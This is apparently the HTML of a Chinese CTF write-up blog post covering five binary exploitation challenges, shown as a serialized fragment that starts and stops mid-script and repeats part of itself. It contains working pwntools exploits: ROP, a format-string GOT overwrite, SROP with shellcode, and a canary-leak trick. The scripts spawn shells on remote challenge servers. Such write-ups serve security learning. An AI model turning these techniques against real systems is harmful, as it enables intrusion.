class=\"keyword\">if</span> local:</div><div class=\"line\">        p = process(<span class=\"string\">'./pwn3'</span>)</div><div class=\"line\">        libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        p = remote(<span class=\"string\">'106.75.93.221'</span>,<span class=\"number\">10002</span>)</div><div class=\"line\">        libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span> p, libc</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn3'</span>)</div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">fgets_got = elf.got[<span class=\"string\">'fgets'</span>]</div><div class=\"line\">stdout = <span class=\"number\">0x0804A060</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upid</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'ID.'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'123456781234'</span>+payload</div><div class=\"line\">    p.sendline(payload.ljust(<span class=\"number\">0x15</span>, <span class=\"string\">'1'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">printname</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'name:'</span>)</div><div class=\"line\">    p.recv(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">printlogo</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.sendline(<span class=\"string\">'5'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upmem</span><span class=\"params\">(num)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">    p.sendline(str(num))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upname</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.send(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span><span class=\"params\">(address)</span>:</span></div><div class=\"line\">    upid(p32(address))</div><div class=\"line\">    printname()</div><div class=\"line\">    data = p.recv(<span class=\"number\">4</span>)</div><div class=\"line\">    log.info(<span class=\"string\">\"%#x =&gt; %s\"</span> % (address, data))</div><div class=\"line\">    <span class=\"keyword\">return</span> data</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">(p)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'id'</span>)</div><div class=\"line\">    p.send(<span class=\"string\">'12345678'</span>)</div><div class=\"line\">    printlogo()</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    d = DynELF(leak, elf=ELF('./pwn3'))</span></div><div class=\"line\"><span class=\"comment\">#    system_addr = d.lookup('system', 'libc')</span></div><div class=\"line\"><span class=\"comment\">#    print system_addr</span></div><div class=\"line\"></div><div class=\"line\">    upid(p32(atoi_got))</div><div class=\"line\">    printname()</div><div class=\"line\">    atoi_addr = u32(p.recv(<span class=\"number\">4</span>)) - <span class=\"number\">0xa000000</span></div><div class=\"line\">    <span class=\"keyword\">print</span> hex(atoi_addr)</div><div class=\"line\"></div><div class=\"line\">    </div><div class=\"line\">    upid(p32(fgets_got))</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    printname()</div><div class=\"line\">    <span class=\"keyword\">print</span> hex(u32(p.recv(<span class=\"number\">4</span>)))</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'atoi_addr =&gt; '</span>, hex(atoi_addr) </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    libc.address = atoi_addr - libc.symbols['atoi']</span></div><div class=\"line\"><span class=\"comment\">#    print 'libc.address =&gt; ', hex(libc.address)</span></div><div class=\"line\"><span class=\"comment\">#    system_addr = libc.symbols['system']</span></div><div class=\"line\"><span class=\"comment\">#    print 'dis libc =&gt; ', hex(atoi_addr - libc.address)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    print 'distance', hex(system_addr - atoi_addr)</span></div><div class=\"line\">    </div><div class=\"line\">    system_addr = atoi_addr + <span class=\"number\">0xf030</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system =&gt; '</span>, hex(system_addr)</div><div class=\"line\">    upmem(<span class=\"number\">5</span>)</div><div class=\"line\">    upname(p32(system_addr))</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    p,libc = makeio()</div><div class=\"line\">    pwn(p)</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn4\"><a href=\"#pwn4\" class=\"headerlink\" title=\"pwn4\"></a>pwn4</h2><p>360春秋杯，原题，SROP不说了。。。因为是centos，还要爆破下偏移，感谢小伙伴@Inj3ct0r的偏移计算。<br>当初写的脚本找不到了，网上找了一个。</p>\n<figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># -*-coding:utf-8-*-</span></div><div class=\"line\"><span class=\"attr\">__author__</span> = 'joker'</div><div class=\"line\">from pwn <span class=\"built_in\">import</span> *</div><div class=\"line\">context.<span class=\"attr\">log_level</span> = <span class=\"string\">\"debug\"</span></div><div class=\"line\">context.<span class=\"attr\">arch</span> = <span class=\"string\">\"amd64\"</span></div><div class=\"line\"><span class=\"comment\">#r = process(\"./pwn4\")</span></div><div class=\"line\"><span class=\"attr\">r</span> = remote('<span class=\"number\">106.75</span>.<span class=\"number\">66.195</span>', <span class=\"number\">11006</span>)</div><div class=\"line\"><span class=\"attr\">syscall_addr</span> = <span class=\"number\">0</span>x4000BE</div><div class=\"line\"><span class=\"attr\">start_addr</span> = <span class=\"number\">0</span>x4000B0</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(start_addr)</div><div class=\"line\">payload += p64(start_addr)<span class=\"comment\">#fill</span></div><div class=\"line\">payload += p64(start_addr)<span class=\"comment\">#fill</span></div><div class=\"line\">r.send(payload)</div><div class=\"line\"><span class=\"comment\">#write infor leak</span></div><div class=\"line\">r.send(<span class=\"string\">\"\\xb3\"</span>)<span class=\"comment\">#write 2 start_addr last byte</span></div><div class=\"line\"><span class=\"attr\">data</span> = r.recv(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"attr\">data</span> = r.recv(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"attr\">stack_addr</span> = u64(data) - <span class=\"number\">0</span>xa00</div><div class=\"line\">print <span class=\"string\">\"[*]:stack:&#123;0&#125;\"</span>.format(hex(stack_addr))</div><div class=\"line\"><span class=\"attr\">frame</span> = SigreturnFrame()</div><div class=\"line\">frame.<span class=\"attr\">rax</span> = constants.SYS_read</div><div class=\"line\">frame.<span class=\"attr\">rdi</span> = <span class=\"number\">0</span></div><div class=\"line\">frame.<span class=\"attr\">rsi</span> = stack_addr</div><div class=\"line\">frame.<span class=\"attr\">rdx</span> = <span class=\"number\">0</span>x300</div><div class=\"line\">frame.<span class=\"attr\">rsp</span> = stack_addr</div><div class=\"line\">frame.<span class=\"attr\">rip</span> = syscall_addr</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(start_addr)</div><div class=\"line\">payload += p64(syscall_addr)</div><div class=\"line\">payload += str(frame)</div><div class=\"line\">r.send(payload)</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\">payload += p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\"><span class=\"attr\">payload</span> = payload[:<span class=\"number\">15</span>]</div><div class=\"line\">r.send(payload)<span class=\"comment\">#set rax=sys_rt_sigreturn</span></div><div class=\"line\"><span class=\"attr\">frame</span> = SigreturnFrame()</div><div class=\"line\">frame.<span class=\"attr\">rax</span> = constants.SYS_mprotect</div><div class=\"line\">frame.<span class=\"attr\">rdi</span> = (stack_addr&amp;<span class=\"number\">0</span>xfffffffffffff000)</div><div class=\"line\">frame.<span class=\"attr\">rsi</span> = <span class=\"number\">0</span>x1000</div><div class=\"line\">frame.<span class=\"attr\">rdx</span> = <span class=\"number\">0</span>x7</div><div class=\"line\">frame.<span class=\"attr\">rsp</span> = stack_addr + <span class=\"number\">0</span>x108</div><div class=\"line\">frame.<span class=\"attr\">rip</span> = syscall_addr</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(start_addr)</div><div class=\"line\">payload += p64(syscall_addr)</div><div class=\"line\">payload += str(frame)</div><div class=\"line\">payload += p64(stack_addr + <span class=\"number\">0</span>x108 + <span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"comment\">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span></div><div class=\"line\">payload += <span class=\"string\">\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"</span><span class=\"comment\">#shellcode</span></div><div class=\"line\">r.send(payload)</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\">payload += p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\"><span class=\"attr\">payload</span> = payload[:<span class=\"number\">15</span>]</div><div class=\"line\">r.send(payload)<span class=\"comment\">#set rax=sys_rt_sigreturn</span></div><div class=\"line\">r.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn5\"><a href=\"#pwn5\" class=\"headerlink\" title=\"pwn5\"></a>pwn5</h2><p>老套路了。。将环境变量中文件名的指针覆盖为flag的地址，<code>__stack_chk_fail</code>时候输出即可。</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./pwnsss'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'106.75.93.221'</span>, <span class=\"number\">10003</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">    payload = p32(<span class=\"number\">0x0804a080</span>) * <span class=\"number\">300</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    print p.recvline()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div></pre></td></tr></table></figure>","excerpt":"<p>第一次ak，记录下。不过主要因为题目很简单。<br></p>","more":"<p></p>\n<h2 id=\"pwn1\"><a href=\"#pwn1\" class=\"headerlink\" title=\"pwn1\"></a>pwn1</h2><p>栈溢出，<code>system</code>已经有了，用rop在.rodata段上写/bin/sh，然后调用system即可。</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./pwn1'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'106.75.93.221'</span>,<span class=\"number\">10000</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn1'</span>)</div><div class=\"line\">system_plt = elf.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">scanf_addr = elf.symbols[<span class=\"string\">'__isoc99_scanf'</span>]</div><div class=\"line\">bss = elf.bss</div><div class=\"line\">main = <span class=\"number\">0x08048531</span></div><div class=\"line\">ppr = <span class=\"number\">0x080485ee</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">offset</span> = <span class=\"number\">52</span></div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    payload = cyclic(<span class=\"built_in\">offset</span>) + p32(scanf_addr) + p32(main) + p32(<span class=\"number\">0x08049629</span>) + p32(<span class=\"number\">0x0804A028</span>)</div><div class=\"line\">    payload1 = cyclic(<span class=\"number\">44</span>) + p32(system_plt) + p32(<span class=\"number\">1234</span>) + p32(<span class=\"number\">0x0804a028</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'test'</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn2\"><a href=\"#pwn2\" class=\"headerlink\" title=\"pwn2\"></a>pwn2</h2><p>格式化字符串漏洞。先泄露<code>__libc_start_main+246</code>的地址，然后将<code>printf</code>的got改成system。问题是我们没有libc。libc的信息是第一题的shell中得到的，用<br><code>readelf -a libc-2.12 | grep __libc_start_main</code>和<code>readelf -a libc-2.12 | grep system</code><br>得到libc中函数的偏移再计算即可。其中要注意libc的页对齐。</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">local</span> = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">global p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span>:</div><div class=\"line\">    p = process(<span class=\"string\">'./pwn2'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'106.75.93.221'</span>,<span class=\"number\">20002</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"keyword\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn2'</span>)</div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\"></div><div class=\"line\">def leak(payload):</div><div class=\"line\">    p = process(<span class=\"string\">'./pwn2'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    <span class=\"keyword\">return</span> p.recvall(<span class=\"number\">0</span>.<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\"><span class=\"comment\"># 7611: 00016c40   437 FUNC    GLOBAL DEFAULT   12 __libc_start_main</span></div><div class=\"line\"><span class=\"comment\"># 6733: 0003ae80   125 FUNC    WEAK   DEFAULT   12 system</span></div><div class=\"line\">    payload = <span class=\"string\">'%267$x'</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    leak_addr = <span class=\"keyword\">int</span>(p.recv(<span class=\"number\">8</span>), <span class=\"number\">16</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'__libc_start_main =&gt; '</span>, <span class=\"keyword\">hex</span>(leak_addr)</div><div class=\"line\">    libc_address = leak_addr - <span class=\"number\">0x0016c30</span> - <span class=\"number\">246</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'libc_address =&gt; '</span>, <span class=\"keyword\">hex</span>(libc_address)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    fmt = FmtStr(leak)</span></div><div class=\"line\"><span class=\"comment\">#    print 'offset =&gt; ', fmt.offset</span></div><div class=\"line\"></div><div class=\"line\">    system_addr = libc_address + <span class=\"number\">0x0003ae80</span></div><div class=\"line\">    <span class=\"keyword\">write</span> = &#123;printf_got:system_addr&#125;</div><div class=\"line\">    payload = fmtstr_payload(<span class=\"number\">7</span>, <span class=\"keyword\">write</span>, <span class=\"number\">0</span>, <span class=\"string\">'byte'</span>)</div><div class=\"line\"><span class=\"comment\">#    payload = fmtstr_payload(fmt.offset, write, 0, 'byte')</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name_<span class=\"number\">_</span> == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a>pwn3</h2><p>logo函数中会把ebp-0x1c的位置填充为0xdadadada，这样当我们一开始输入id长度为8时最后的\\x00就会被覆盖，这样在update id的时候strlen函数就会把0xdadadada以及下面的name的堆指针给计算进去，我们修改id的时候就能修改到name指针。这样我们就存在了任意地址读和写。</p>\n<p>将name指针改为atoi_got，print name得到libc地址，将其修改为system地址传入/bin/sh即可。同样的，偏移在pwn1的shell中得到。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\">local = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\"><span class=\"keyword\">global</span> libc</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">makeio</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    <span class=\"keyword\">if</span> local:</div><div class=\"line\">        p = process(<span class=\"string\">'./pwn3'</span>)</div><div class=\"line\">        libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        p = remote(<span class=\"string\">'106.75.93.221'</span>,<span class=\"number\">10002</span>)</div><div class=\"line\">        libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span> p, libc</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn3'</span>)</div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">fgets_got = elf.got[<span class=\"string\">'fgets'</span>]</div><div class=\"line\">stdout = <span class=\"number\">0x0804A060</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upid</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    